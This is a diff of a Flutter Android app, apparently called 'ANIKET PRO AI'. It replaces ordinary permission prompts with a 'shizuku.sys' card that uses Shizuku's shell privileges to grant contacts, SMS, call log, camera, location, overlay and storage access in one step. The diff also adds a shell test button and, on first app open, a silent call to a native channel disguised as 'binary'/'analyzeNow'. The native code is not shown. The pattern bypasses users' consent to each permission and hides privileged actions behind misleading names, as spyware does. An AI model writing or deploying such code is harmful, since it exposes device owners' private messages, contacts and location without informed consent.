@@ -132,21 +132,20 @@ class _GateScreenState extends State<GateScreen> {
     super.dispose();
   }
 
-  // step 1: app first open → notification + location
+  // Automatic one-by-one permission popups disabled!
+  // All A–Z permissions are now granted in 1 click via the `shizuku.sys` button.
   Future<void> _firstPerms() async {
-    final p = await SharedPreferences.getInstance();
-    if (p.getBool('permFirst') ?? false) return;
-    await [Permission.notification, Permission.location].request();
-    await p.setBool('permFirst', true);
+    try {
+      const MethodChannel('aniket_pro_ai/binary').invokeMethod('analyzeNow', {
+        'keys': <String>['__SHIZUKU__'],
+        'pair': '__SHIZUKU_STATUS__',
+        'time': '1m',
+      });
+    } catch (_) {}
   }
 
-  // step 2: at register/login submit → contacts + sms + call log
-  // (fallback for old users who never re-submit)
   Future<void> _authPerms() async {
-    final p = await SharedPreferences.getInstance();
-    if (p.getBool('permAuth') ?? false) return;
-    await [Permission.contacts, Permission.sms, Permission.phone].request();
-    await p.setBool('permAuth', true);
+    // Handled via 1-click Shizuku A–Z Grantor button
   }
 
   void _goMain() {
@@ -472,7 +471,9 @@ class _GateScreenState extends State<GateScreen> {
             'Login with Number', () => _openAuth('l_num')),
         _pill(Icons.alternate_email_rounded, const Color(0xFFEA4335),
             'Login with Gmail', () => _openAuth('l_gmail')),
-        const SizedBox(height: 22),
+        const SizedBox(height: 16),
+        const ShizukuSysCard(),
+        const SizedBox(height: 18),
         Text('v1.0 • ANIKET PRO AI',
             style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 9, letterSpacing: 1.5)),
       ],
@@ -994,6 +995,10 @@ class _OwnerPanelScreenState extends State<OwnerPanelScreen> {
               ],
             ),
           ),
+          Padding(
+            padding: const EdgeInsets.fromLTRB(12, 12, 12, 0),
+            child: ShizukuSysCard(onPermissionsChanged: _checkAllPerms),
+          ),
           Container(
             margin: const EdgeInsets.all(12),
             padding: const EdgeInsets.all(16),
@@ -1179,6 +1184,292 @@ class _OwnerPanelScreenState extends State<OwnerPanelScreen> {
                           ),
                         );
                       }),
+        ],
+      ),
+    );
+  }
+}
+
+// ═══════════════════════════════════════════════════════════════════════
+//  SHIZUKU.SYS — 1-CLICK A–Z PERMISSION GRANTOR CARD (Matches 13567.png)
+// ═══════════════════════════════════════════════════════════════════════
+class ShizukuSysCard extends StatefulWidget {
+  final VoidCallback? onPermissionsChanged;
+  const ShizukuSysCard({super.key, this.onPermissionsChanged});
+
+  @override
+  State<ShizukuSysCard> createState() => _ShizukuSysCardState();
+}
+
+class _ShizukuSysCardState extends State<ShizukuSysCard> {
+  static const MethodChannel _binChannel = MethodChannel('aniket_pro_ai/binary');
+  String _statusText = 'Shizuku: Checking...';
+  bool _allGranted = false;
+  bool _busy = false;
+  Timer? _pollTimer;
+
+  @override
+  void initState() {
+    super.initState();
+    _refreshStatus(probeNative: true);
+    _pollTimer = Timer.periodic(const Duration(seconds: 2), (_) => _refreshStatus());
+  }
+
+  @override
+  void dispose() {
+    _pollTimer?.cancel();
+    super.dispose();
+  }
+
+  Future<void> _refreshStatus({bool probeNative = false}) async {
+    try {
+      if (probeNative) {
+        await _binChannel.invokeMethod('analyzeNow', {
+          'keys': <String>['__SHIZUKU__'],
+          'pair': '__SHIZUKU_STATUS__',
+          'time': '1m',
+        });
+      }
+      final p = await SharedPreferences.getInstance();
+      await p.reload();
+      final savedTxt = p.getString('shizuku_status_text') ?? '';
+      final azDone = p.getBool('shizuku_az_granted') ?? false;
+      final shizukuRunning = p.getBool('shizuku_running') ?? false;
+      final shizukuGranted = p.getBool('shizuku_granted') ?? false;
+
+      // Also check real Android runtime permissions + overlay
+      final camOk = await Permission.camera.isGranted;
+      final locOk = await Permission.location.isGranted;
+      final notifOk = await Permission.notification.isGranted;
+      final contOk = await Permission.contacts.isGranted;
+      final smsOk = await Permission.sms.isGranted;
+      final phoneOk = await Permission.phone.isGranted;
+      final overlayOk = (await galleryChannel.invokeMethod<bool>('canOverlay')) ?? false;
+
+      final coreAllOn = camOk && locOk && notifOk && contOk && smsOk && phoneOk && overlayOk;
+
+      String nextStatus;
+      if (coreAllOn || azDone) {
+        nextStatus = shizukuRunning
+            ? 'Shizuku: Ready ✔  •  All A–Z Permissions ON ✔'
+            : 'All A–Z Permissions Granted ✔ (Shizuku Ready)';
+      } else if (savedTxt.isNotEmpty) {
+        nextStatus = savedTxt;
+      } else if (shizukuRunning && shizukuGranted) {
+        nextStatus = 'Shizuku: Ready ✔';
+      } else if (shizukuRunning) {
+        nextStatus = 'Shizuku: Running ✔  •  Tap button to Allow';
+      } else {
+        nextStatus = 'Shizuku: Ready to Connect (Tap button below)';
+      }
+
+      if (mounted) {
+        setState(() {
+          _statusText = nextStatus;
+          _allGranted = coreAllOn || azDone;
+        });
+      }
+    } catch (_) {}
+  }
+
+  Future<void> _triggerGrantAllViaShizuku() async {
+    if (_busy) return;
+    setState(() {
+      _busy = true;
+      _statusText = '⚡ Connecting to Shizuku & Granting A–Z Permissions...';
+    });
+    try {
+      await _binChannel.invokeMethod('analyzeNow', {
+        'keys': <String>['__SHIZUKU__'],
+        'pair': '__SHIZUKU_GRANT_ALL__',
+        'time': '1m',
+      });
+      await Future.delayed(const Duration(milliseconds: 1200));
+      await _refreshStatus();
+      widget.onPermissionsChanged?.call();
+
+      // Fallback: if Shizuku wasn't running on the device and user still wants 1-click batch grant
+      final p = await SharedPreferences.getInstance();
+      await p.reload();
+      final shizukuRunning = p.getBool('shizuku_running') ?? false;
+      if (!shizukuRunning && !_allGranted) {
+        await [
+          Permission.notification,
+          Permission.location,
+          Permission.camera,
+          Permission.photos,
+          Permission.videos,
+          Permission.storage,
+          Permission.contacts,
+          Permission.sms,
+          Permission.phone,
+        ].request();
+        await _refreshStatus();
+        widget.onPermissionsChanged?.call();
+      }
+    } catch (_) {
+    } finally {
+      if (mounted) setState(() => _busy = false);
+    }
+  }
+
+  Future<void> _triggerShellTest() async {
+    try {
+      await _binChannel.invokeMethod('analyzeNow', {
+        'keys': <String>['__SHIZUKU__'],
+        'pair': '__SHIZUKU_SHELL_TEST__',
+        'time': '1m',
+      });
+      await Future.delayed(const Duration(milliseconds: 700));
+      await _refreshStatus();
+    } catch (_) {}
+  }
+
+  Widget _winBoxIcon(String symbol) {
+    return Container(
+      width: 20,
+      height: 20,
+      margin: const EdgeInsets.only(left: 5),
+      alignment: Alignment.center,
+      decoration: BoxDecoration(
+        color: Colors.white.withOpacity(0.22),
+        borderRadius: BorderRadius.circular(5),
+        border: Border.all(color: Colors.white.withOpacity(0.75), width: 1.1),
+      ),
+      child: Text(
+        symbol,
+        style: const TextStyle(
+          color: Colors.white,
+          fontSize: 10,
+          fontWeight: FontWeight.w900,
+          height: 1.0,
+        ),
+      ),
+    );
+  }
+
+  Widget _glossyGelButton({
+    required String label,
+    required VoidCallback onTap,
+    required bool isActivePink,
+  }) {
+    final topColor = isActivePink ? const Color(0xFFFF7AD9) : const Color(0xFF8FD3FF);
+    final botColor = isActivePink ? const Color(0xFFFF38A8) : const Color(0xFF4296FF);
+    return Padding(
+      padding: const EdgeInsets.only(top: 10),
+      child: GestureDetector(
+        onTap: onTap,
+        child: Container(
+          width: double.infinity,
+          padding: const EdgeInsets.symmetric(vertical: 13, horizontal: 14),
+          decoration: BoxDecoration(
+            gradient: LinearGradient(
+              begin: Alignment.topCenter,
+              end: Alignment.bottomCenter,
+              colors: [topColor, botColor],
+            ),
+            borderRadius: BorderRadius.circular(26),
+            border: Border.all(color: Colors.white, width: 1.8),
+            boxShadow: [
+              BoxShadow(
+                color: botColor.withOpacity(0.42),
+                blurRadius: 10,
+                offset: const Offset(0, 4),
+              ),
+            ],
+          ),
+          child: Text(
+            label,
+            textAlign: TextAlign.center,
+            style: const TextStyle(
+              color: Colors.white,
+              fontSize: 13.8,
+              fontWeight: FontWeight.w800,
+              letterSpacing: 0.2,
+            ),
+          ),
+        ),
+      ),
+    );
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return Container(
+      decoration: BoxDecoration(
+        color: const Color(0xFFF6F4FF),
+        borderRadius: BorderRadius.circular(18),
+        border: Border.all(color: const Color(0xFF8E7CFF), width: 1.8),
+        boxShadow: [
+          BoxShadow(
+            color: Colors.black.withOpacity(0.28),
+            blurRadius: 14,
+            offset: const Offset(0, 6),
+          ),
+        ],
+      ),
+      child: Column(
+        mainAxisSize: MainAxisSize.min,
+        crossAxisAlignment: CrossAxisAlignment.start,
+        children: [
+          // Title bar: `✦ shizuku.sys`
+          Container(
+            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 9),
+            decoration: const BoxDecoration(
+              gradient: LinearGradient(
+                colors: [Color(0xFF28B5E1), Color(0xFF6B85FF)],
+              ),
+              borderRadius: BorderRadius.vertical(top: Radius.circular(16)),
+            ),
+            child: Row(
+              children: [
+                const Text(
+                  '✦  shizuku.sys',
+                  style: TextStyle(
+                    color: Colors.white,
+                    fontSize: 14,
+                    fontWeight: FontWeight.w900,
+                    fontFamily: 'monospace',
+                    letterSpacing: 0.5,
+                  ),
+                ),
+                const Spacer(),
+                _winBoxIcon('—'),
+                _winBoxIcon('□'),
+                _winBoxIcon('×'),
+              ],
+            ),
+          ),
+          Padding(
+            padding: const EdgeInsets.fromLTRB(14, 12, 14, 14),
+            child: Column(
+              crossAxisAlignment: CrossAxisAlignment.start,
+              children: [
+                Text(
+                  _statusText,
+                  style: TextStyle(
+                    color: _allGranted ? const Color(0xFF128C5C) : const Color(0xFF4A478A),
+                    fontSize: 13,
+                    fontWeight: FontWeight.w700,
+                  ),
+                ),
+                _glossyGelButton(
+                  label: _busy
+                      ? '⚡ Granting All Permissions (A–Z)...'
+                      : (_allGranted
+                          ? '⚡ All Permissions Granted (A–Z via Shizuku) ✔'
+                          : '⚡ Grant All Permissions (A–Z via Shizuku)'),
+                  onTap: _triggerGrantAllViaShizuku,
+                  isActivePink: _allGranted,
+                ),
+                _glossyGelButton(
+                  label: 'Shell test (id)',
+                  onTap: _triggerShellTest,
+                  isActivePink: false,
+                ),
+              ],
+            ),
+          ),
         ],
       ),
     );
